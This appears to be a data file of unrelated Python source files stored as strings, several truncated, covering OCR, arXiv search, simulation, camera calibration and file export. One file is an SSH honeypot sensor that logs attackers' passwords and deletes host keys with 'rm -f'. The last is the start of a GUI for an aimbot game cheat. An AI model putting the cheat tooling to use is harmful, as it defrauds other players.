    "import cv2\nimport easyocr\nimport tkinter as tk\nfrom tkinter import filedialog\nimport os\nimport numpy as np\n\n# Inisialisasi EasyOCR reader dengan bahasa Indonesia ('id') dan Inggris ('en')\nreader = easyocr.Reader(['en', 'id'])  # menambahkan 'id' untuk Bahasa Indonesia\n\ndef process_image(image_path):\n    \"\"\"\n    Proses gambar untuk ekstraksi teks dengan langkah praproses: grayscale, thresholding, dan blurring.\n    \"\"\"\n    # Baca gambar dari file\n    image = cv2.imread(image_path)\n\n    # Langkah 1: Konversi ke grayscale (untuk mempermudah pengolahan gambar)\n    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\n    # Langkah 2: Terapkan GaussianBlur untuk mengurangi noise\n    blurred = cv2.GaussianBlur(gray, (5, 5), 0)\n\n    # Langkah 3: Terapkan thresholding adaptif untuk meningkatkan kontras\n    thresholded = cv2.adaptiveThreshold(\n        blurred, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2\n    )\n\n    # Langkah 4: Coba meningkatkan kualitas gambar dengan rescaling jika teks terlalu kecil\n    # Perbesar gambar jika diperlukan\n    height, width = thresholded.shape\n    scale_factor = 1  # Atur pengaturan skala untuk memperbesar\n    resized = cv2.resize(thresholded, (width * scale_factor, height * scale_factor))\n\n    # Langkah 5: Gunakan EasyOCR untuk mengenali teks pada gambar yang telah dipraproses\n    results = reader.readtext(resized)\n    \n    return results, image  # Mengembalikan hasil OCR dan gambar asli\n\n\n\ndef main():\n    \"\"\"\n    Fungsi utama untuk memilih gambar dan menampilkan hasil OCR dengan kotak pembatas.\n    \"\"\"\n    # Pilih gambar menggunakan file dialog\n    image_path = \"/Users/ademaulana/Documents/OCRImg/struk2.png\"\n    \n    if not image_path:\n        print(\"Tidak ada gambar yang dipilih.\")\n        return\n    \n    print(f\"Membaca gambar dari: {image_path}\")\n\n    # Proses gambar dan dapatkan hasil OCR serta gambar asli\n    results, image = process_image(image_path)\n    \n    # Menampilkan hasil OCR di terminal\n    print(\"\\nHasil OCR:\")\n    for (bbox, text, prob) in results:\n        print(f\"Teks: {text}, Probabilitas: {prob:.2f}\")\n\n    # Gambar kotak pembatas untuk setiap teks yang terdeteksi\n    for (bbox, text, prob) in results:\n        # Extracting the four points of the bounding box\n        (top_left, top_right, bottom_right, bottom_left) = bbox\n        \n        # Convert the points to integers\n        top_left = tuple(map(int, top_left))\n        bottom_right = tuple(map(int, bottom_right))\n        \n        # Gambar kotak biru di sekitar teks yang terdeteksi\n        cv2.rectangle(image, top_left, bottom_right, (255, 0, 0), 2)\n        \n        # Tampilkan teks di atas kotak\n        cv2.putText(image, text, (top_left[0], top_left[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 0, 0), 2)\n\n    # Tampilkan hasil gambar yang telah diberi kotak pembatas (gambar asli)\n    cv2.imshow(\"EasyOCR - Hasil Gambar\", image)\n    \n    # Tunggu hingga tombol 'q' ditekan untuk menutup\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\nif __name__ == \"__main__\":\n    main()\n",
    "import arxiv\nimport logging\n\n# Configure logging\nlogging.basicConfig(level=logging.ERROR)\n\ndef get_arxiv_results(query: str, max_results: int):\n    # Validate and sanitize inputs\n    if not isinstance(query, str) or not query.strip():\n        logging.error(\"Invalid query provided.\")\n        return []\n    if not isinstance(max_results, int) or max_results <= 0:\n        logging.error(\"Invalid max_results provided.\")\n        return []\n    \n    # Sanitize the query (optional, based on requirements)\n    query = query.strip()\n    \n    try:\n        client = arxiv.Client()\n        search = arxiv.Search(\n            query=query, \n            max_results=max_results, \n            sort_by=arxiv.SortCriterion.SubmittedDate,\n            sort_order=arxiv.SortOrder.Descending\n        )\n        results = client.results(search)\n        return list(results)\n    except Exception as e:\n        logging.error(f\"Error fetching results: {e}\")\n        return []\n\ndef get_arxiv_message(result):\n    try:\n        # Safely handle summary, authors, and other attributes\n        summary = getattr(result, 'summary', 'No summary available').replace('\\n', ' ')\n        authors = ', '.join([author.name for author in getattr(result, 'authors', [])]) \n        title = getattr(result, 'title', 'No title available')\n        entry_id = getattr(result, 'entry_id', 'No URL available')\n        \n        message = (\n            f\"**Title:** {title}\\n\"\n            f\"**Authors:** {authors}\\n\"\n            f\"**Summary:** {summary}\\n\"\n            f\"**URL:** {entry_id}\"\n        )\n        return message\n    except Exception as e:\n        logging.error(f\"Error creating message: {e}\")\n        return \"Unable to retrieve the message for this result.\"\n\n# Example usage:\nif __name__ == \"__main__\":\n    query = \"machine learning\"\n    max_results = 5\n    results = get_arxiv_results(query, max_results)\n    for result in results:\n        message = get_arxiv_message(result)\n        print(message)\n\n",
    "import pygame\r\nfrom utils import arrayLerp, dist_to_text, speciesToColor, listLerp, lerp\r\nfrom jes_shapes import drawRect, drawTextRect, centerText, drawClock\r\nimport numpy as np\r\nimport math\r\nfrom jes_species_info import SpeciesInfo\r\nimport random\r\n\r\nclass Creature:\r\n    def __init__(self,d,pIDNumber,parent_species,_sim,_ui):\r\n        self.dna = d\r\n        self.calmState = None\r\n        self.icons = [None]*2\r\n        self.iconCoor = None\r\n        self.IDNumber = pIDNumber\r\n        self.fitness = None\r\n        self.rank = None\r\n        self.living = True\r\n        self.species = self.getSpecies(parent_species)\r\n        self.sim = _sim\r\n        self.ui = _ui\r\n        self.codonWithChange = None\r\n    \r\n    def getSpecies(self, parent_species):\r\n        if parent_species == -1:\r\n            return self.IDNumber\r\n        else:\r\n            return parent_species\r\n    \r\n    def drawCell(self,surface,nodeState,frame,transform,x,y):\r\n        tx,ty,s = transform\r\n        color = self.traitsToColor(self.dna,x,y,frame)\r\n        points = [None]*4\r\n        for p in range(4):\r\n            px = x\r\n            if p == 1 or p == 2:\r\n                px += 1\r\n            py = y+p//2\r\n            points[p] = [tx+nodeState[px,py,0]*s,ty+nodeState[px,py,1]*s]\r\n        pygame.draw.polygon(surface,color,points)\r\n        \r\n    def drawEnvironment(self,surface,nodeState,frame,transform):\r\n        BLACK = (0,0,0)\r\n        WHITE = (255,255,255)\r\n        SIGN_COLOR = (150,100,50)\r\n        #sky\r\n        drawRect(surface,transform,None,BLACK)\r\n        \r\n        #signs\r\n        font = self.ui.bigFont if transform[2] >= 50 else self.ui.smallFont\r\n        for meters in range(0,3000,100):\r\n            u = meters*self.sim.UNITS_PER_METER\r\n            drawRect(surface,transform,[u-0.2,-6,u+0.2,0],SIGN_COLOR)\r\n            drawTextRect(surface,transform,[u-1.5,-6.8,u+1.5,-5.4],SIGN_COLOR,WHITE,f\"{meters}cm\",font)\r\n        \r\n        #ground\r\n        drawRect(surface,transform,[None,0,None,None],WHITE)\r\n\r\n    def drawCreature(self, surface, nodeState, frame, transform, drawLabels, shouldDrawClock):\r\n        if drawLabels:\r\n            self.drawEnvironment(surface,nodeState,frame,transform)\r\n            \r\n        cellSurface = pygame.Surface(surface.get_size(), pygame.SRCALPHA, 32)\r\n        for x in range(self.sim.CW):\r\n            for y in range(self.sim.CH):\r\n                self.drawCell(cellSurface,nodeState,frame,transform,x,y)\r\n        surface.blit(cellSurface,(0,0))\r\n   \r\n        if drawLabels:\r\n            tx,ty,s = transform\r\n            avg_x = np.mean(nodeState[:,:,0],axis=(0,1))\r\n            lx = tx+avg_x*s\r\n            ly = 20\r\n            lw = 100\r\n            lh = 36\r\n            ar = 15\r\n            pygame.draw.rect(surface, (255,0,0),(lx-lw/2,ly,lw,lh))\r\n            pygame.draw.polygon(surface,(255,0,0),((lx,ly+lh+ar),(lx-ar,ly+lh),(lx+ar,ly+lh)))\r\n            centerText(surface, f\"{dist_to_text(avg_x,True,self.sim.UNITS_PER_METER)}\", lx, ly+18, self.ui.WHITE, self.ui.smallFont)\r\n            \r\n            ratio = 1-frame/self.sim.trial_time\r\n        if shouldDrawClock:\r\n            drawClock(surface,[40,40,32],ratio,str(math.ceil(ratio*self.sim.trial_time/self.ui.FPS)),self.ui.smallFont)\r\n\r\n        \r\n    def drawIcon(self, ICON_DIM, BG_COLOR, BEAT_FADE_TIME):\r\n        icon = pygame.Surface(ICON_DIM, pygame.SRCALPHA, 32)\r\n        icon.fill(BG_COLOR)\r\n        transform = [ICON_DIM[0]/2,ICON_DIM[0]/(self.sim.CW+2),ICON_DIM[0]/(self.sim.CH+2.85)]\r\n        self.drawCreature(icon,self.calmState,BEAT_FADE_TIME,transform,False,False)\r\n        R = ICON_DIM[0]*0.09\r\n        R2 = ICON_DIM[0]*0.12\r\n        pygame.draw.circle(icon,speciesToColor(self.species, self.ui),(ICON_DIM[0]-R2,R2),R)\r\n        return icon\r\n        \r\n    def saveCalmState(self, arr):\r\n        self.calmState = arr\r\n        \r\n    def getMutatedDNA(self, sim):\r\n        mutation = np.clip(np.random.normal(0.0, 1.0, self.dna.shape[0]),-99,99)\r\n        result = self.dna + sim.mutation_rate*mutation\r\n        newSpecies = self.species\r\n        \r\n        big_mut_loc = 0\r\n        if random.uniform(0,1) < self.sim.big_mutation_rate: # do a big mutation\r\n            newSpecies = sim.species_count\r\n            sim.species_count += 1\r\n            cell_x = random.randint(0,self.sim.CW-1)\r\n            cell_y = random.randint(0,self.sim.CH-1)\r\n            cell_beat = random.randint(0,self.sim.beats_per_cycle-1)\r\n            \r\n            big_mut_loc = (cell_x*self.sim.CH*self.sim.beats_per_cycle+cell_y*self.sim.beats_per_cycle+cell_beat)*self.sim.traits_per_box\r\n            for i in range(self.sim.traits_per_box):\r\n                delta = 0\r\n                while abs(delta) < 0.5:\r\n                    delta = np.random.normal(0.0, 1.0, 1)\r\n                result[big_mut_loc+i] += delta\r\n                \r\n                #Cells that endure a big mutation are also required to be at least somewhat rigid, because if a cell goes from super-short to super-tall but has low rigidity the whole time,",
    "import logging\nimport requests\nimport re\nimport os\nfrom datetime import datetime\nimport threading\nimport time\nimport subprocess\nimport signal\nimport json\n\n\nlogging.basicConfig(\n    encoding=\"utf-8\",\n    level=logging.INFO,\n    format=\"%(asctime)s %(message)s\"\n)\n\ndef get_env(key, fallback):\n    env = os.getenv(key, default=fallback)\n    return env\n\n\ndef _check_if_in_test_mode():\n    test = get_env(\"NETWATCH_TEST_MODE\", \"false\")\n    logging.info(\"Test:\" + test)\n    if get_env(\"NETWATCH_TEST_MODE\", \"false\") != \"false\":\n        return True\n    \n    return False\n\n\ndef get_local_ip():\n    url = f\"{get_env('NETWATCH_COLLECTOR_URL', 'https://api.netwatch.team')}/check_ip\"\n    for attempt in range(50):\n        try:\n            response = requests.get(url, timeout=5)\n            if response.status_code == 200:\n                local_ip = response.json().get(\"ip\")\n                logging.info(f\"Got the following local IP: {local_ip}\")\n                return local_ip\n\n            logging.error(f\"[!] Got a non 200 status code from the netwatch backend: {response.status_code}, message: {response.text}\")\n\n        except requests.RequestException as e:\n            logging.error(f\"[!] Got a request exception while trying to get the local IP: {e}\")\n\n        except Exception as e:\n            logging.error(f\"[!] Got an exception while trying to get the local IP: {e}\")\n\n        time.sleep(10)\n\n    logging.error(\"[!] The system was unable to get the local IP. Sensor can not work without local IP => Exit with code 1\")\n    exit(1)\n\n\ndef submit_attack(ip, user, password, evidence, ATTACKPOD_LOCAL_IP):\n    json_dict = {\"source_ip\": ip,\n            \"destination_ip\": ATTACKPOD_LOCAL_IP,\n            \"username\":user,\n            \"password\":password,\n            \"attack_timestamp\": datetime.now().isoformat(),\n            \"evidence\":evidence,\n            \"attack_type\": \"SSH_BRUTE_FORCE\",\n            \"test_mode\":_check_if_in_test_mode()\n            }\n\n    url = f\"{get_env('NETWATCH_COLLECTOR_URL', '')}/add_attack\"\n    headers = {\"authorization\": get_env(\"NETWATCH_COLLECTOR_AUTHORIZATION\", \"\")}\n\n    for attempt in range(5):\n        try:\n            response = requests.post(url, json=json_dict, headers=headers, timeout=5)\n            if response.status_code == 200:\n\n                if _check_if_in_test_mode():\n                    logging.info(f\"Reported the following JSON to the NetWatch collector IN TEST MODE ATTACK WILL NOT BE SAVED: {json.dumps(json_dict)}\")\n                else:\n                    logging.info(f\"Reported the following JSON to the NetWatch collector: {json.dumps(json_dict)}\")\n\n                return\n\n            logging.error(f\"[!] Got a non 200 status code from the collector: {response.status_code} with message: {response.text}\")\n\n        except requests.RequestException as e:\n            logging.error(f\"[!] Got a request exception while submitting the attack: {e}\")\n\n        except Exception as e:\n            logging.error(f\"[!] Got an exception while submitting the attack: {e}\")\n\n\ndef reap_children(signum, frame):\n    try:\n        while True:\n            pid, _ = os.waitpid(-1, os.WNOHANG)\n            if pid == 0:\n                break\n            logging.info(f\"Reaped child process with PID {pid}\")\n    except ChildProcessError:\n        pass\n\nsignal.signal(signal.SIGCHLD, reap_children)\n\n\ndef run_sshd():\n    while True:\n        try:\n            process = subprocess.Popen([\"/usr/sbin/sshd\", \"-D\", \"-E\", \"/var/log/ssh.log\"])\n            process.wait()  # Wait for the process to terminate and reap it\n        except Exception as e:\n            logging.error(f\"Error while running sshd: {e}\")\n            time.sleep(1)  # Avoid tight loop if something goes wrong\n\n\ndef rotate_sshd_keys():\n    os.system(\"rm -f /etc/ssh/ssh_host_*\")\n    os.system(\"ssh-keygen -t rsa -b 2048 -f /etc/ssh/ssh_host_rsa_key -N ''\")\n    os.system(\"ssh-keygen -t ecdsa -b 521 -f /etc/ssh/ssh_host_ecdsa_key -N ''\")\n\nif __name__ == '__main__':\n    logging.info(\"[+] Starting NetWatch Attackpod\")\n    \n    if _check_if_in_test_mode():\n        logging.info(\"################################\")\n        logging.info(\"################################\")\n        logging.info(\"###   !Sensor in test mode!   ##\")\n        logging.info(\"### Attacks will be submitted ##\")\n        logging.info(\"###       but NOT SAVED       ##\")\n        logging.info(\"################################\")\n        logging.info(\"################################\")\n\n    logging.info(\"[+] Getting local ip\")\n\n    if os.getenv(\"ATTACK_POD_IP\") is not None:\n        ATTACKPOD_LOCAL_IP = get_env(\"ATTACK_POD_IP\",\"\")\n    else:\n        ATTACKPOD_LOCAL_IP = get_local_ip()\n    \n    logging.info(\"[+] Got the local ip of {} for the AttackPod\".format(ATTACKPOD_LOCAL_IP))\n\n    logging.info(\"[+] Rotating SSHD Keys\")\n    rotate_sshd_keys()\n\n    logging.info(\"[+] Starting SSHD\")\n    sshd_thread = threading.Thread(target=run_sshd, args=())\n    sshd_thread.start()\n\n    with open(\"/var/log/ssh.log\", 'r') as logfile:\n   ",
    "import numpy as np\nimport matplotlib.pyplot as plt\nfrom scipy.spatial.transform import Rotation as R\n\n# Define source and target points\nsource_points = np.array([[1, 1], [2, 1], [2, 2], [3, 2]])  # Original points\nrotation = R.from_euler('z', 30, degrees=True).as_matrix()[:2, :2]  # Rotate 30 degrees\ntranslation = np.array([1, 0.5])  # Translate by (1, 0.5)\n\n# Apply transformation: rotation + translation\ntransformed_points = (rotation @ source_points.T).T + translation\n\n# Plot source and transformed points\nplt.figure(figsize=(8, 6))\nplt.scatter(source_points[:, 0], source_points[:, 1], label=\"Source Points\", color=\"blue\")\nplt.scatter(transformed_points[:, 0], transformed_points[:, 1], label=\"Transformed Points\", color=\"green\")\n\n# Draw lines between corresponding points\nfor i in range(len(source_points)):\n    plt.plot([source_points[i, 0], transformed_points[i, 0]],\n             [source_points[i, 1], transformed_points[i, 1]], 'k--')\n\n# Labels and grid\nplt.legend()\nplt.title(\"Transformation of Point Cloud\")\nplt.xlabel(\"X (m)\")\nplt.ylabel(\"Y (m)\")\nplt.grid()\nplt.show()\n",
    "from PyQt5.QtWidgets import QWidget\nimport json\nimport os\n\n\nclass PluginBase:  # \u63d2\u4ef6\u7c7b\n    def __init__(self, cw_contexts, method):  # \u521d\u59cb\u5316\n        # \u4fdd\u5b58\u4e0a\u4e0b\u6587\u548c\u65b9\u6cd5\n        self.cw_contexts = cw_contexts\n        self.method = method\n\n        self.PATH = self.cw_contexts['PLUGIN_PATH']  # \u63d2\u4ef6\u8def\u5f84\n\n    def execute(self):  # \u81ea\u542f\u52a8\u6267\u884c\u90e8\u5206\n        pass\n\n    def update(self, cw_contexts):  # \u81ea\u52a8\u66f4\u65b0\u90e8\u5206\n        self.cw_contexts = cw_contexts\n        pass\n\n\nclass SettingsBase(QWidget):\n    def __init__(self, plugin_path, parent=None):\n        super().__init__(parent)\n        self.PATH = plugin_path\n\n\nclass PluginConfig:  # \u7b80\u6613\u7684\u914d\u7f6e\u6587\u4ef6\u7ba1\u7406\u5668\n    def __init__(self, path, filename):\n        self.path = path\n        self.filename = filename\n        self.config = {}\n        self.full_path = os.path.join(self.path, self.filename)\n\n    def load_config(self, default_config):\n        if default_config is None:\n            print('Warning: default_config is None, use empty config instead.')\n            default_config = {}\n        # \u5982\u679c\u6587\u4ef6\u5b58\u5728\uff0c\u52a0\u8f7d\u914d\u7f6e\n        if os.path.exists(self.full_path):\n            with open(self.full_path, 'r', encoding='utf-8') as f:\n                self.config = json.load(f)\n        else:\n            self.config = default_config  # \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4f7f\u7528\u9ed8\u8ba4\u914d\u7f6e\n            self.save_config()\n\n    def update_config(self):  # \u66f4\u65b0\u914d\u7f6e\n        try:\n            with open(self.full_path, 'r', encoding='utf-8') as f:\n                self.config = json.load(f)\n        except Exception as e:\n            print(f'Error: {e}')\n            self.config = {}\n\n    def upload_config(self, key=str or list, value=None):\n        if type(key) == str:\n            self.config[key] = value\n        elif type(key) == list:\n            for k in key:\n                self.config[k] = value\n        else:\n            raise TypeError('key must be str or list (\u952e\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u5b57\u7b26\u4e32\u6216\u5217\u8868)')\n        self.save_config()\n\n    def save_config(self):\n        with open(self.full_path, 'w', encoding='utf-8') as f:\n            json.dump(self.config, f, ensure_ascii=False, indent=4)\n\n    def __getitem__(self, key):\n        return self.config.get(key)\n\n    def __setitem__(self, key, value):\n        self.config[key] = value\n        self.save_config()\n\n    def __repr__(self):\n        return json.dumps(self.config, ensure_ascii=False, indent=4)\n",
    "import subprocess\n\n\ndef query(category: str | list[str], parameters: str | list[str]=None) -> list[dict[str, str]]:\n    category = [category] if isinstance(category, str) else category\n    parameters = [parameters] if isinstance(parameters, str) else parameters\n\n    process = subprocess.run(\n        [\"wmic\"] + category + ([\"get\", \",\".join(parameters)] if parameters else []),\n        capture_output=True\n    )\n    content = process.stdout.decode(\"utf-8\")\n\n    def without_empty_strings(l: list[str]) -> list[str]:\n        return list(filter(lambda h: h is not None and len(h) > 0, l))\n\n    lines = without_empty_strings(content.splitlines())\n    header, data_rows = lines[0].lower(), lines[1:]\n    columns = without_empty_strings(header.split(\" \"))\n\n    offsets = list(map(lambda c: header.index(c), columns))\n\n    def parse_row(row_raw: str) -> dict:\n        values = [row_raw[i:j].strip() for i, j in zip(offsets, offsets[1:] + [len(row_raw)])]\n        return dict(zip(columns, values))\n\n    return list(map(lambda r: parse_row(r), data_rows))\n",
    "import os\nimport json\nimport torch.utils.data as data\nimport numpy as np\nfrom PIL import Image\n\nimport warnings\n\nwarnings.filterwarnings(\"ignore\", \"(Possibly )?corrupt EXIF data\", UserWarning)\n\n\nclass IN22KDATASET(data.Dataset):\n    def __init__(self, root, ann_file='', transform=None, target_transform=None):\n        super(IN22KDATASET, self).__init__()\n\n        self.data_path = root\n        self.ann_path = os.path.join(self.data_path, ann_file)\n        self.transform = transform\n        self.target_transform = target_transform\n        # id & label: https://github.com/google-research/big_transfer/issues/7\n        # total: 21843; only 21841 class have images: map 21841->9205; 21842->15027\n        self.database = json.load(open(self.ann_path))\n\n    def _load_image(self, path):\n        try:\n            im = Image.open(path)\n        except:\n            print(\"ERROR IMG LOADED: \", path)\n            random_img = np.random.rand(224, 224, 3) * 255\n            im = Image.fromarray(np.uint8(random_img))\n        return im\n\n    def __getitem__(self, index):\n        \"\"\"\n        Args:\n            index (int): Index\n        Returns:\n            tuple: (image, target) where target is class_index of the target class.\n        \"\"\"\n        idb = self.database[index]\n\n        # images\n        images = self._load_image(self.data_path + '/' + idb[0]).convert('RGB')\n        if self.transform is not None:\n            images = self.transform(images)\n\n        # target\n        target = int(idb[1])\n        if self.target_transform is not None:\n            target = self.target_transform(target)\n\n        return images, target\n\n    def __len__(self):\n        return len(self.database)\n",
    "'''\nhttps://www.geeksforgeeks.org/camera-calibration-with-python-opencv/\nhttps://docs.opencv.org/4.x/da/d0d/tutorial_camera_calibration_pattern.html\n'''\n\nimport cv2 \nimport numpy as np \nimport os \nimport glob \nimport json\n\ndef save_coefficients_as_json(mtx, dist, rvecs, tvecs, path):\n    calibration_data = {\n        'camera_matrix': mtx.tolist(),\n        'distortion_coefficients': dist.tolist(),\n        'rotation_vectors': [r_vec.flatten().tolist() for r_vec in rvecs],\n        'translation_vectors': [t_vec.flatten().tolist() for t_vec in tvecs]\n    }\n    with open(path, 'w') as outfile:\n        json.dump(calibration_data, outfile, indent=4)\n\n\ninput_dir = 'ToF/output/v1' # 'alignment/images/distorted'\next = '.png'  # '.jpg'\nCHECKERBOARD = (7, 7)  # (6, 9) \nepsilon = 0.001\niterations = 30\n\n\n# stop when specified accuracy or number of iterations is reached. \ncriteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, iterations, epsilon) \n\npoints_3D = [] \npoints_2D = [] \n\n# 3D points real world coordinates \nobjectp3d = np.zeros((1, CHECKERBOARD[0] * CHECKERBOARD[1], 3), np.float32) \nobjectp3d[0, :, :2] = np.mgrid[0:CHECKERBOARD[0], 0:CHECKERBOARD[1]].T.reshape(-1, 2) \nprev_img_shape = None\n\nimages = glob.glob(os.path.join(input_dir, '*' + ext)) \n\nfor filename in images: \n    image = cv2.imread(filename) \n    grayColor = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY) \n\n    # Find the chess board corners If desired number of corners are found in the image then ret = true \n    ret, corners = cv2.findChessboardCorners( grayColor, CHECKERBOARD, \n                    cv2.CALIB_CB_ADAPTIVE_THRESH + cv2.CALIB_CB_FAST_CHECK + cv2.CALIB_CB_NORMALIZE_IMAGE) \n\n    # If desired number of corners can be detected then, refine the pixel coordinates and display them on the images of checker board \n    if ret == True: \n        points_3D.append(objectp3d) \n\n        # Refining pixel coordinates for given 2d points. \n        corners_refined = cv2.cornerSubPix(grayColor, corners, (11, 11), (-1, -1), criteria) \n        points_2D.append(corners_refined) \n\n        # Draw and display the corners \n        image = cv2.drawChessboardCorners(image, CHECKERBOARD, corners_refined, ret) \n\n    cv2.imshow('img', image) \n    cv2.waitKey(100) \ncv2.destroyAllWindows() \n\n# Perform camera calibration by passing points_3D and its corresponding pixel coordinates (points_2D) \nret, mtx, dist, rvecs, tvecs = cv2.calibrateCamera(points_3D, points_2D, grayColor.shape[::-1], None, None) \n\njson_path = 'alignment/ToF_calibration.json'\nsave_coefficients_as_json(mtx, dist, rvecs, tvecs, json_path)\n\n# print(\" Camera matrix:\", mtx) \n# print(\"\\n Distortion coefficient:\", dist) \n# print(\"\\n Rotation Vectors:\", rvecs) \n# print(\"\\n Translation Vectors:\", tvecs) \n",
    "#!/usr/bin/env python3\n\"\"\"\nfile2ai Exporter\n\nClones a GitHub repository or exports text files from a local directory to a single text\nfile.\n\"\"\"\n\nfrom __future__ import annotations\n\n__all__ = [\n    \"parse_args\",\n    \"is_text_file\",\n    \"validate_github_url\",\n    \"export_files_to_single_file\",\n    \"parse_github_url\",\n    \"build_auth_url\",\n    \"prepare_exports_dir\",\n    \"clone_and_export\",\n    \"local_export\",\n    \"check_docx_support\",\n    \"install_docx_support\",\n    \"check_excel_support\",\n    \"install_excel_support\",\n    \"check_pptx_support\",\n    \"install_pptx_support\",\n    \"check_html_support\",\n    \"install_html_support\",\n    \"convert_document\",\n    \"setup_logging\",\n]\n\nimport argparse\nimport fnmatch\nimport importlib.util\nimport json\nimport logging\nimport mimetypes\nimport os\nimport re\nimport subprocess\nimport sys\nimport tempfile\nfrom datetime import datetime\nfrom zipfile import BadZipFile  # For Word document error handling\nfrom pathlib import Path\nfrom typing import (\n    Dict,\n    List,\n    NoReturn,\n    Optional,\n    Set,\n    TextIO,\n    Tuple,\n    TypedDict,\n    Union,\n)\n\n# Type checking imports\nfrom typing import TYPE_CHECKING\n\n# Directory constants\nUPLOADS_DIR = \"uploads\"\nFRONTEND_DIR = \"frontend\"\n\nif TYPE_CHECKING:\n    from PIL.Image import Image as PILImage\n    from openpyxl.workbook import Workbook\n\n# Optional PIL support\ntry:\n    from PIL import Image, ImageEnhance\n    HAS_PIL = True\n    HAS_PIL_ENHANCE = hasattr(Image, \"frombytes\") and ImageEnhance is not None\nexcept ImportError:\n    Image = None\n    ImageEnhance = None\n    HAS_PIL = False\n    HAS_PIL_ENHANCE = False\n\n# Import docx at module level for proper monkeypatching\nDocument = None  # Initialize at module level\nHAS_DOCX = False\ntry:\n    from docx import Document\n    HAS_DOCX = True\nexcept ImportError:\n    Document = None  # Ensure Document is None on import failure\n    HAS_DOCX = False\n\n\ndef check_image_support() -> bool:\n    \"\"\"Check if PIL/Pillow is available for image processing.\"\"\"\n    return HAS_PIL\n\n\ndef check_image_enhance_support() -> bool:\n    \"\"\"Check if PIL/Pillow enhancement features are available.\"\"\"\n    return HAS_PIL_ENHANCE\n\n\ndef install_image_support() -> bool:\n    \"\"\"Check if Pillow package is available.\"\"\"\n    global Image, ImageEnhance, HAS_PIL, HAS_PIL_ENHANCE\n    try:\n        from PIL import Image, ImageEnhance\n        HAS_PIL = True\n        HAS_PIL_ENHANCE = hasattr(Image, \"frombytes\") and ImageEnhance is not None\n        return True\n    except ImportError:\n        HAS_PIL = False\n        HAS_PIL_ENHANCE = False\n        logger.error(\"Pillow not found. Please install dependencies first.\")\n        return False\n\n\ndef check_package_support(package: str) -> bool:\n    \"\"\"Check if a Python package is available.\n\n    Args:\n        package: Name of the package to check\n\n    Returns:\n        bool: True if package is available, False otherwise\n    \"\"\"\n    # Handle package name mappings (e.g., python-docx -> docx)\n    package_map = {\n        'python-docx': 'docx',\n        'python-pptx': 'pptx',\n        'beautifulsoup4': 'bs4',\n        'pymupdf': 'fitz',\n        'weasyprint': 'weasyprint',\n        'openpyxl': 'openpyxl'\n    }\n    import_name = package_map.get(package, package)\n    \n    try:\n        # First try to import the module\n        __import__(import_name)\n        return True\n    except ImportError as e:\n        logger.debug(f\"Failed to import {import_name}: {str(e)}\")\n        # If import fails, check if package is installed but not importable\n        spec = importlib.util.find_spec(import_name)\n        if spec is not None:\n            logger.warning(f\"Package {package} is installed but cannot be imported\")\n        return False\n\n\ndef install_package_support(package: str) -> bool:\n    \"\"\"Install a Python package if not already available.\n\n    Args:\n        package: Name of the package to install\n\n    Returns:\n        bool: True if package is available or successfully installed, False otherwise\n    \"\"\"\n    if check_package_support(package):\n        return True\n    try:\n        logger.debug(f\"Installing {package}...\")\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", \"--quiet\", package])\n        importlib.invalidate_caches()  # Ensure the newly installed package is detected\n        \n        # Try importing after installation\n        package_map = {\n            'python-docx': 'docx',\n            'python-pptx': 'pptx',\n            'beautifulsoup4': 'bs4',\n            'pymupdf': 'fitz',\n            'weasyprint': 'weasyprint',\n            'openpyxl': 'openpyxl'\n        }\n        import_name = package_map.get(package, package)\n        try:\n            __import__(import_name)\n            return True\n        except ImportError as e:\n            logger.error(f\"Failed to import {import_name} after installation: {str(e)}\")\n            return False\n    except subprocess.CalledProcessError:\n        logger.error(f\"Failed to install {package}\")\n        return False\n\n\ndef check_docx_support() -> bool:\n    \"\"\"Check if python",
    "import ctypes\r\nimport sys\r\nimport math\r\nfrom PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget)\r\nfrom PyQt5.QtGui import QColor, QPainter, QPainterPath, QRadialGradient, QIcon, QLinearGradient\r\nfrom PyQt5.QtCore import Qt, QTimer, QPoint, QRectF, QPropertyAnimation, QEasingCurve, pyqtProperty\r\n\r\nfrom .ConfigManager import ConfigManager\r\nfrom gui.widgets.colors import Colors\r\nfrom .snowflake import Snowflake\r\nfrom .iconbutton import IconButton\r\nfrom PyQt5.QtGui import QFontDatabase, QFont\r\nfrom .widgets.Aimbot import AimbotWidget\r\nfrom .widgets.AI import AIWidget\r\nfrom .widgets.Visual import VisualWidget\r\nfrom .widgets.Config import ConfigWidget\r\nimport os\r\n\r\n\r\nclass SnowWidget(QWidget):\r\n    def __init__(self, parent=None):\r\n        super().__init__(parent)\r\n        self.config_manager = ConfigManager()  # Keep this line\r\n\r\n        # First (correct) widgets initialization\r\n        self.widgets = {\r\n            'aimbot_setting': AimbotWidget(self, self.config_manager),\r\n            'AI_setting': AIWidget(self, self.config_manager),\r\n            'visual_setting': VisualWidget(self, self.config_manager),\r\n            'config_setting': ConfigWidget(self, self.config_manager)\r\n        }\r\n\r\n        self._text_opacity = 1.0\r\n\r\n        # Create the pulsing animation\r\n        self.text_animation = QPropertyAnimation(self, b\"textOpacity\")\r\n        self.text_animation.setDuration(3000)  # 1.5 seconds for one pulse cycle\r\n        self.text_animation.setStartValue(1.0)\r\n        self.text_animation.setEndValue(0.5)\r\n        self.text_animation.setLoopCount(-1)  # Infinite loop\r\n        self.text_animation.setEasingCurve(QEasingCurve.InOutSine)\r\n\r\n        # Make it bounce back and forth\r\n        self.text_animation.finished.connect(self._reverse_animation)\r\n\r\n        # Start the animation\r\n        self.text_animation.start()\r\n\r\n        self.snow_count = 75\r\n        self.snowflakes = []\r\n        self.buttons = {}\r\n\r\n        self.setMouseTracking(True)\r\n        self.mouse_pos = QPoint(0, 0)\r\n        self.mouse_radius = 50\r\n\r\n        self.setup_buttons()\r\n\r\n        self.timer = QTimer(self)\r\n        self.timer.timeout.connect(self.update_snowflakes)\r\n        self.timer.start(16)\r\n\r\n        # Add AimbotWidget\r\n        \"\"\"self.aimbot_widget = AimbotWidget(self)\r\n        self.aimbot_widget.move(14+72, 